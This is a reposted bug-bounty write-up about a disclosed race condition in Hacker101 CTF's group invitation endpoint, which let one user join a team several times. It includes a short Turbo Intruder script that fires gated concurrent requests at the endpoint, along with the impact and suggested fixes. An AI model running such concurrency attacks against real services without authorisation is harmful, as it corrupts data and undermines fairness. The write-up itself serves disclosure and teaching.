# :game_die: $500 Bounty: Race Condition in Hacker101 CTF Group Join

> **Original Source:** [$500 Bounty: Race Condition in Hacker101 CTF Group Join](https://infosecwriteups.com/500-bounty-race-condition-in-hacker101-ctf-group-join-d7e84651bc5f)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# $500 Bounty: Race Condition in Hacker101 CTF Group Join


## $500 for discovering a timing flaw in Hacker101’s invite system that let users join the same team multiple times


### Overview


Concurrency bugs while often overlooked, can cause unexpected behaviors that may disrupt user experience and system reliability. In this case, a race condition in the Hacker101 CTF group invitation mechanism led to a user being able to join the same team multiple times using one invitation link simply by abusing the timing of parallel HTTP requests.


This vulnerability, responsibly disclosed by zeyu2001 earned a $500 bounty and serves as a great case study in spotting and exploiting race conditions in real-world applications.

### Background


The Hacker101 CTF platform ([https://ctf.hacker101.com/](https://ctf.hacker101.com/)) allows users to form groups and collaborate to solve challenges. Group leaders can generate invitation links to let others join their teams.


While this feature seems simple at first glance it turns out the backend wasn’t fully safeguarding against multiple concurrent join requests opening the door for a race condition exploit.


Interestingly a similar issue had been reported before under #604534 but a slight change in implementation caused the issue to resurface proving once again that race conditions are tricky to eliminate without proper concurrency handling.

### Vulnerability Details


The endpoint in question:


```
https://ctf.hacker101.com/group/join?invite=...
```


When accessed normally, it adds the user to the group once. But what if we made dozens of requests simultaneously to this URL?


That’s what zeyu2001 explored.


By leveraging Turbo Intruder a Burp Suite extension specifically designed for race condition and timing attacks they were able to send a barrage of concurrent requests that resulted in multiple successful group joins by the same user.

>

Steps to Reproduce


Let’s break down how this was exploited.


Team leader generates an invite link.


## Get Monika sharma’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Example:


```
https://ctf.hacker101.com/group/join?invite=fdb4ba75da6e8da41650369d24e3866f90384550f952474df194db8077bda8b0
```


The user intercepts this request using Burp Suite.

### Exploit Script (Turbo Intruder):


```
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=100,
requestsPerConnection=100,
pipeline=True
)

for i in range(30):
engine.queue(target.req, gate='race1')

engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```


### Observing the Exploit in Action


After launching the attack, the user observed several HTTP 200 OK responses, which indicated that the join request had been processed successfully for each one.


From the CTF user’s view, the platform showed their account listed multiple times in the same group.


Even the group leader’s interface confirmed the same with duplicate member entries cluttering the team list.


### Impact


While the immediate security threat might seem low (no data theft or privilege escalation) the impact is still meaningful especially in a collaborative platform like Hacker101’s CTF:


- Inaccurate Team Stats: Group statistics like member counts and progress tracking get corrupted.

- Leaderboard Manipulation: If point calculations are affected by member counts this could affect fairness.

- Spam and UI Bugs: Duplicated users could clutter UIs and break assumptions in frontend code.

- Indicator of Poor Concurrency Design: A sign of broader issues in backend design that could be more exploitable elsewhere.

### Technical Lesson: Why Race Conditions Matter


This case underscores a simple but critical security lesson: just because something is rare doesn’t mean it’s safe.


Race conditions typically arise in multi-threaded systems or event-driven environments where simultaneous operations aren’t properly synchronized. While hard to test manually tools like Turbo Intruder make it easy to probe such conditions.


Proper fixes include:


- Using mutexes/locks to ensure one request completes before another can process.

- Implementing idempotent joins (e.g., using unique constraints to ensure one user per group).

- Validating state after the fact to clean up duplicates.

### Credit


- Hunter: [zeyu2001](https://hackerone.com/zeyu2001)

- Bounty: $500

- Report id: #1540969

### Final Thoughts


While not every race condition is a ticking time bomb this bug shows how even minor lapses in concurrency handling can result in broken logic and abuse.


Thanks to researchers like zeyu2001 these flaws can be responsibly reported and fixed before they lead to deeper issues.


If you’re a developer working on any system that handles state transitions invitations or transactions always think about timing. And if you’re a bug bounty hunter keep Turbo Intruder in your toolkit and keep looking for those slim windows of opportunity.

>

Thank you 🙏Monika☕✨

---

*Originally published on [Medium](https://infosecwriteups.com/500-bounty-race-condition-in-hacker101-ctf-group-join-d7e84651bc5f). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
